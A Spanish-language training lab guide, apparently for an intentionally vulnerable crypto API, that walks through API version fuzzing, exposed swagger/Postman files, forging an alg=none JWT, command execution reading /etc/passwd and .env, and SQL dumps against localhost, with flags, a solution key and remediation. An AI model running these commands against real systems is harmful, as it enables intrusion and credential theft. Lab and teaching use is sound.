# LAB 12 - API Inventory & Version Fuzzing

## Fase de la Metodologia: 2 - API INVENTORY

---

## Objetivo

Aplicar la segunda fase del pentest de API: **descubrir versiones, ambientes y specs ocultas** del API. Construir el inventario completo de endpoints (incluso los que el equipo no documenta) usando OpenAPI/Swagger filtrados, colecciones de Postman, y enumeracion de versiones (`v1`, `v2`, `v3`, `internal`, `test`, `dev`, `staging`).

Esta fase responde: *"que APIs existen?"*. La fase 3 respondera *"que endpoints tiene cada una?"*.

---

## Contexto

OWASP API9:2023 (Improper Inventory Management) es una de las vulnerabilidades mas frecuentes en organizaciones medianas-grandes. Las causas tipicas:

1. **Versiones beta/experimentales** que se despliegan para QA y nunca se descomisionan.
2. **Specs publicos incompletos** vs **specs internos completos** - alguien expone el interno por error.
3. **Ambientes paralelos** (staging, dev, sandbox) con misma DB pero sin los mismos controles.
4. **Microservicios "internos"** que quedan accesibles desde el LB publico.
5. **Colecciones de Postman/Insomnia** publicadas en GitHub o expuestas en docroot.

CryptoVulnX implementa los 5 patrones simultaneamente.

---

## Hallazgos esperados

| Hallazgo | Como descubrirlo | Que rompe |
|---|---|---|
| `/api/swagger.json` | Wordlist `api-endpoints` o `quickhits.txt`, o pista en `security.txt` | Lista los `x-internal-servers` con `v2`, `v3`, `internal`, `test`, `dev`, `staging` |
| `/api/v1/openapi.json` | Pista en swagger.json | Lista TODOS los endpoints + headers magicos + cookies magicas + campos mass-assignable |
| `/postman_collection.json` | Wordlist comun | JWT admin firmado con `crypto123` + tokens admin/internal |
| `/api/v2/auth/login.php` | Cambio de version en URL | Sin rate limit, expone query SQL |
| `/api/v3/auth/login.php` | Idem | Acepta `alg=none` directamente |
| `/api/v3/admin/exec.php` | Wordlist + verb fuzz POST | RCE sin auth |
| `/api/test/users.php` | Wordlist `api-endpoints` | Dump completo (users + wallets + private_keys) |
| `/api/dev/dump.php` | Idem | Query SQL arbitraria |
| `/api/staging/auth/login.php` | Idem | Login a misma DB sin rate limit |
| `/api/internal/rates.php` | Idem (ya existia en LAB09) | Manipulacion de precios |

---

## Herramientas Recomendadas

| Herramienta | Uso |
|---|---|
| `kiterunner kr scan` | Brute de endpoints API con wordlists curadas |
| `ffuf -mc 200,401,403` | Fuzzing rapido por status codes |
| `arjun --get` | Detectar parametros validos |
| `Postman` | Importar `postman_collection.json` y replay |
| `swagger-ui` local | Visualizar `swagger.json` y `openapi.json` |
| `curl + jq` | Comparar respuestas v1 vs v2 vs v3 |

---

## Wordlists Recomendados

```
SecLists/Discovery/Web-Content/api/api-endpoints.txt
SecLists/Discovery/Web-Content/api/objects.txt
SecLists/Discovery/Web-Content/api/actions.txt
SecLists/Discovery/Web-Content/quickhits.txt
assetnote/wordlists/data/automated/swagger.txt
wordlists/cryptovulnx-api-versions.txt   (incluido)
```

`wordlists/cryptovulnx-api-versions.txt`:

```
v1
v2
v3
v4
beta
internal
test
testing
dev
develop
development
staging
sandbox
qa
preview
canary
nightly
legacy
old
deprecated
private
admin
gateway
public
```

---

## Dificultad

**Media** - hay que identificar que `swagger.json` no es la fuente de verdad y buscar la version interna.

---

## Pistas

<details>
<summary>Pista 1 - Buscar swagger</summary>

```bash
TARGET=http://localhost:8080

# Spec publico
curl -s $TARGET/api/swagger.json | jq

# Pista: el campo x-internal-servers lista versiones ocultas
curl -s $TARGET/api/swagger.json | jq '."x-internal-servers"'

# Hay un spec interno?
curl -s $TARGET/api/v1/openapi.json | jq | head -50
curl -s $TARGET/api/v1/openapi.json | jq '."x-undocumented-endpoints" // .paths | keys'
```

</details>

<details>
<summary>Pista 2 - Fuzzing de versiones</summary>

```bash
# Brute de versiones de API
ffuf -w wordlists/cryptovulnx-api-versions.txt \
     -u $TARGET/api/FUZZ/auth/login.php \
     -mc 200,401,405 -t 30
```

Hits esperados: `v1`, `v2`, `v3`, `staging`. Test/dev/internal no tienen `auth/login.php` pero si otros endpoints (probar fuzzing directo de paths).

</details>

<details>
<summary>Pista 3 - Comparar respuestas</summary>

```bash
for V in v1 v2 v3 staging; do
    echo "=== /api/$V/auth/login.php ==="
    curl -s -X POST $TARGET/api/$V/auth/login.php \
        -H "Content-Type: application/json" \
        -d '{"username":"x","password":"y"}'
    echo
done
```

v3 te invita a probar con `Authorization: Bearer <jwt-alg-none>`.

</details>

<details>
<summary>Pista 4 - alg=none en v3</summary>

```bash
# Forjar JWT con alg=none que diga role=admin
HEADER=$(echo -n '{"typ":"JWT","alg":"none"}' | base64 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n '{"user_id":1,"username":"admin","role":"admin"}' | base64 | tr -d '=' | tr '+/' '-_')
TOKEN="${HEADER}.${PAYLOAD}."

curl -s $TARGET/api/v3/auth/login.php \
     -H "Authorization: Bearer $TOKEN"
```

</details>

<details>
<summary>Pista 5 - RCE en /api/v3/admin/exec.php</summary>

```bash
curl -s "$TARGET/api/v3/admin/exec.php?cmd=id"
curl -s "$TARGET/api/v3/admin/exec.php?cmd=cat+/var/www/html/.env"
```

</details>

<details>
<summary>Pista 6 - Postman collection</summary>

```bash
curl -s $TARGET/postman_collection.json | jq '.variable, .auth'
```

Te llevas: `adminToken=admin_dev_bypass_v1`, `internalToken=internal_svc_token_2024_q1`, `jwtSecret=crypto123`, y un JWT firmado con esos datos.

</details>

---

## Solucion Resumida

```bash
TARGET=http://localhost:8080

# 1. Sacar swagger publico y mirar x-internal-servers
curl -s $TARGET/api/swagger.json | jq '."x-internal-servers"'

# 2. Sacar openapi interno
curl -s $TARGET/api/v1/openapi.json | jq '.paths | keys'

# 3. Postman collection
curl -s $TARGET/postman_collection.json | jq '.variable[] | {key, value}'

# 4. Forjar JWT alg=none
H=$(printf '{"typ":"JWT","alg":"none"}' | base64 | tr -d '=' | tr '+/' '-_')
P=$(printf '{"user_id":1,"role":"admin"}' | base64 | tr -d '=' | tr '+/' '-_')
curl -s "$TARGET/api/v3/auth/login.php" -H "Authorization: Bearer $H.$P."

# 5. RCE en v3
curl -s "$TARGET/api/v3/admin/exec.php?cmd=cat+/etc/passwd"

# 6. Dump completo via /api/test/
curl -s "$TARGET/api/test/users.php" | jq '.users[] | {username, password_plain, role}'

# 7. Query arbitraria via /api/dev/
curl -s "$TARGET/api/dev/dump.php?q=SELECT+*+FROM+internal_config"
```

---

## Flags

```
FLAG-INVENT-01  -> swagger.json/x-internal-servers
FLAG-INVENT-02  -> openapi.json (lista todo)
FLAG-INVENT-03  -> postman_collection.json (tokens hardcoded)
FLAG-INVENT-04  -> v3/auth/login alg=none
FLAG-INVENT-05  -> v3/admin/exec.php RCE
FLAG-INVENT-06  -> test/users.php dump
FLAG-INVENT-07  -> dev/dump.php query arbitraria
FLAG-INVENT-08  -> staging mirror sin rate limit
```

---

## Como esto encadena con las siguientes fases

| Hallazgo Fase 2 | Habilita en Fase... |
|---|---|
| Lista de endpoints en `openapi.json` | Fase 3 (fuzzing dirigido a `/admin/*`, `/internal/*`) |
| `x-magic-headers` en `openapi.json` | Fase 4 (header fuzzing) |
| `x-mass-assign-bug` y `x-hidden-body-params` | Fase 4 (body param fuzzing) |
| RCE en `/api/v3/admin/exec.php` | Fase 5 - lectura de `.env` real, dump de DB |
| Query arbitraria en `/api/dev/dump.php` | Fase 5 - extraccion de internal_config |
| JWT con alg=none aceptado | Fase 5 - LAB02 escalado |

---

## Remediacion

```php
// Para cada version expuesta:
// - Inventariarla en un registry
// - Decidir status: active / deprecated / decommissioned
// - Bloquear via WAF/Apache las decommissioned

// Eliminar archivos:
// rm -rf api/v2/ api/v3/ api/test/ api/dev/ api/staging/
// O rewrite a 404:
//   <LocationMatch "^/api/(v2|v3|test|dev|staging)/">
//       Require all denied
//   </LocationMatch>

// /api/internal/ - bloquear por IP allowlist:
//   <LocationMatch "^/api/internal/">
//       Require ip 10.0.0.0/8
//       Require ip 172.16.0.0/12
//       Require ip 192.168.0.0/16
//   </LocationMatch>

// Swagger publico: NUNCA exponer x-internal-servers ni x-undocumented-endpoints
// Mover openapi.json a un repo privado o servir solo desde un host interno
```
